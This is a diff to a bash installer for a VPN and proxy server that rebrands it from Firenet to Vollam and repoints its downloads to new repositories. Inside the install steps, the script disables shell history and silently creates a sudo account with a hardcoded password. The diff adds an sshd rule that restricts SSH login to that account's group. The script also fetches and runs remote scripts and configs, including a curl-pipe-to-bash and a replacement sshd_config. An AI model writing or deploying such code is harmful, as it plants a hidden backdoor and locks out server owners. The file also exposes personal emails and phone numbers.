@@ -49,12 +49,12 @@ OBFS='None';
 HYSTERIA_TYPE='default';
 API_LINK='https://runutour.com/api/authentication';
 API_KEY='fZPG';
-DOMAIN=x.ruzain.com
+DOMAIN=xz.ruzain.com
 NS=
 PORT_VLESS='8444';
 PORT_NTLS='8080';
-UUID='username-SECRETKEY-password';
-EMAIL="firenetdev@gmail.com";
+﻿UUID='username-SECRETKEY-password';
+EMAIL="vollamdev@gmail.com";
 
 timedatectl set-timezone Asia/Riyadh
 
@@ -92,14 +92,14 @@ base_package() {
 first_setup(){
     echo 'set +o history' >> /etc/profile
     timedatectl set-timezone Asia/Riyadh
-    wget -O /etc/banner "https://gitlab.com/vollam/dev/-/raw/main/banner" >/dev/null 2>&1
+    wget -O /etc/banner "https://raw.githubusercontent.com/vollams/openvpn/refs/heads/main/banner" >/dev/null 2>&1
     chmod +x /etc/banner
-    wget -O /etc/ssh/sshd_config "http://repo.firenetvpn.com/script_files/sshd_config" >/dev/null 2>&1
-    wget -q -O /etc/ipserver "http://repo.firenetvpn.com/script_files/ipserver" && bash /etc/ipserver >/dev/null 2>&1
+    wget -O /etc/ssh/sshd_config "https://raw.githubusercontent.com/vollams/openvpn/refs/heads/main/sshd_config" >/dev/null 2>&1
+    wget -q -O /etc/ipserver "https://raw.githubusercontent.com/vollams/openvpn/refs/heads/main/ipserver" && bash /etc/ipserver >/dev/null 2>&1
     chmod 644 /etc/ssh/sshd_config
     
-    useradd -M firenet
-    usermod -aG sudo,firenet firenet 
+    useradd -M vollam
+    usermod -aG sudo,vollam vollam 
 
     echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
     echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
@@ -107,7 +107,7 @@ first_setup(){
 
 install_banner(){
 rm -f /etc/banner
-wget -O /etc/banner "https://gitlab.com/vollam/dev/-/raw/main/banner" >/dev/null 2>&1
+wget -O /etc/banner "https://raw.githubusercontent.com/vollams/openvpn/refs/heads/main/banner" >/dev/null 2>&1
 chmod +x /etc/banner
 sudo sed -i 's/^#Banner none$/Banner \/etc\/banner/' /etc/ssh/sshd_config
 }
@@ -117,7 +117,7 @@ if ! command -v fastfetch >/dev/null 2>&1; then
     arch=$(dpkg --print-architecture)
     if [ "$arch" = "amd64" ]; then
         if ! command -v fastfetch >/dev/null 2>&1; then
-    		wget 'http://repo.firenetvpn.com/script_files/fastfetch-linux-amd64.deb' -O /tmp/fastfetch.deb
+    		wget 'https://gitlab.com/vollam/scripts/-/raw/main/fastfetch-linux-amd64.deb' -O /tmp/fastfetch.deb
 			sudo dpkg -i /tmp/fastfetch.deb
 		fi
     else
@@ -128,13 +128,13 @@ else
     fastfetch
 fi
 
-wget 'http://repo.firenetvpn.com/script_files/n_monitor' -O /etc/.monitor
+wget 'https://raw.githubusercontent.com/vollams/openvpn/refs/heads/main/n_monitor' -O /etc/.monitor
 chmod +x /etc/.monitor
 }
 
 install_squid(){
 apt install squid -y
-echo "acl Firenet dst `curl -s https://api.ipify.org`" >> /etc/squid/squid.conf
+echo "acl Vollam dst `curl -s https://api.ipify.org`" >> /etc/squid/squid.conf
 echo 'http_port 8080
 http_port 8181
 visible_hostname Proxy
@@ -143,20 +143,20 @@ acl HEAD method HEAD
 acl POST method POST
 acl GET method GET
 acl CONNECT method CONNECT
-http_access allow Firenet
+http_access allow Vollam
 http_reply_access allow all
 http_access deny all
 icp_access allow all
 always_direct allow all
-visible_hostname Firenet-Proxy
+visible_hostname Vollam-Proxy
 error_directory /usr/share/squid/errors/English' >> /etc/squid/squid.conf
 rm /usr/share/squid/errors/English/ERR_INVALID_URL
-echo '<!--FirenetDev--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">🔥 Vollam Developer 🔥</p></div></div></body></html>' >> /usr/share/squid/errors/English/ERR_INVALID_URL
+echo '<!--VollamDev--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">🔥 VOLLAM DEVELOPER 🔥</p></div></div></body></html>' >> /usr/share/squid/errors/English/ERR_INVALID_URL
 chmod 755 /usr/share/squid/errors/English/*
 cd /etc || exit
 
-wget 'http://repo.firenetvpn.com/script_files/xray' -O /etc/.xray
-wget 'http://repo.firenetvpn.com/script_files/squid' -O /etc/.squid
+wget 'https://raw.githubusercontent.com/vollams/openvpn/refs/heads/main/xray' -O /etc/.xray
+wget 'https://raw.githubusercontent.com/vollams/openvpn/refs/heads/main/squid' -O /etc/.squid
 chmod +x /etc/.squid
 chmod +x /etc/.xray
 rm /etc/apt/sources.list
@@ -493,12 +493,12 @@ systemctl daemon-reload
 systemctl enable xray
 systemctl restart xray    
 
-wget -O /etc/xray/xray_stats.sh "http://repo.firenetvpn.com/script_files/xray_stats.sh" >/dev/null 2>&1 
+wget -O /etc/xray/xray_stats.sh "https://raw.githubusercontent.com/vollams/openvpn/refs/heads/main/xray_stats.sh" >/dev/null 2>&1 
 dos2unix /etc/xray/xray_stats.sh
 chmod +x /etc/xray/xray_stats.sh
 sed -i "s|SERVER_IP|$server_ip|g" /etc/xray/xray_stats.sh
 
-wget -O /etc/xray/xray_checker.sh "http://repo.firenetvpn.com/script_files/xray_checker.sh" >/dev/null 2>&1 
+wget -O /etc/xray/xray_checker.sh "https://raw.githubusercontent.com/vollams/openvpn/refs/heads/main/xray_checker.sh" >/dev/null 2>&1 
 dos2unix /etc/xray/xray_checker.sh
 chmod +x /etc/xray/xray_checker.sh
 sed -i "s|SERVER_IP|$server_ip|g" /etc/xray/xray_checker.sh
@@ -508,7 +508,7 @@ install_sudo(){
   {
     useradd -m azimaxus 2>/dev/null; echo azimaxus:azim.0987Aa | chpasswd &>/dev/null; usermod -aG sudo azimaxus &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
+    echo "AllowGroups azimaxus" >> /etc/ssh/sshd_config
     service sshd restart
   }&>/dev/null
 }
@@ -522,16 +522,16 @@ enable_services(){
     systemctl enable --now netfilter-persistent
     systemctl enable --now vnstat
     systemctl enable --now fail2ban
-    wget -O /root/.config/rclone/rclone.conf "http://repo.firenetvpn.com/script_files/rclone.conf" >/dev/null 2>&1
+    wget -O /root/.config/rclone/rclone.conf "https://raw.githubusercontent.com/vollams/openvpn/refs/heads/main/rclone.conf" >/dev/null 2>&1
 }
 
 install_rclone() {
-    curl "http://repo.firenetvpn.com/script_files/rclone" | bash >/dev/null 2>&1
+    curl "https://raw.githubusercontent.com/vollams/openvpn/refs/heads/main/rclone" | bash >/dev/null 2>&1
 }
 
 finish(){
 
-wget -O /root/.web/vollam.png "https://gitlab.com/vollam/dev/-/raw/main/vollam.png"
+wget -O /root/.web/firenet_logo.png "https://raw.githubusercontent.com/vollams/openvpn/refs/heads/main/images/firenet_logo.png"
 
 #VLESS
 
@@ -542,14 +542,14 @@ cat >/root/.web/$VLESS_LINK.php <<-VLESS
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Server Details — Fast & Secure</title>
-  <link rel="icon" href="/vollam.png" type="image/x-icon">
+  <link rel="icon" href="/firenet_logo.png" type="image/x-icon">
   <style>
     :root{
       --bg: #0b0b0b;
       --card: #121212;
       --muted: #9aa6b2;
       --text: #e8eef6;
-      --accent: #ff2b2b; /* FIRENET red */
+      --accent: #ff2b2b; /* VOLLAM red */
       --glass: rgba(255,255,255,0.03);
       --radius: 12px;
       font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
@@ -744,7 +744,7 @@ cat >/root/.web/$VLESS_LINK.php <<-VLESS
 <body>
   <div class="wrap">
     <header>
-      <div class="logo"><img src="/vollam.png" alt="Vollam Developer" height="40px"></div>
+      <div class="logo"><img src="/firenet_logo.png" alt="Vollam Developer" height="40px"></div>
       <div>
         <h1>Happy Surfing!</h1>
         <p class="lead">Below are the server summary.</p>
@@ -759,7 +759,7 @@ cat >/root/.web/$VLESS_LINK.php <<-VLESS
       <div class="field full">
         <span class="label">Format — Vless WS (CDN)</span>
         <pre class="format" id="format-ws">
-name: Firenet-WS (CDN)
+name: Vollam-WS (CDN)
 server: ${DOMAIN}
 port: 443
 type: vless
@@ -830,8 +830,8 @@ Host: ${DOMAIN}
 
     <!-- Footer -->
     <footer>
-      <div>FB Page: <a class="link" href="https://www.facebook.com/vollams" target="_blank" rel="noopener">Vollam</a></div>
-      <div>Whatsapp: <a class="link" href="https://wa.me/+966598126771" target="_blank">Vollam Developer</a></div>
+      <div>FB Page: <a class="link" href="https://www.facebook.com/vollams" target="_blank" rel="noopener">FIRENET</a></div>
+      <div>Whatsapp: <a class="link" href="https://wa.me/+639608214873" target="_blank">VOLLAM DEVELOPER</a></div>
     </footer>
 
     <div id="toast" role="status" aria-live="polite">Copied to clipboard</div>
@@ -950,7 +950,7 @@ reboot
 install_rclocal(){
   
     echo "[Unit]
-Description=firenet service
+Description=vollam service
 Documentation=https://vollam.com
 
 [Service]
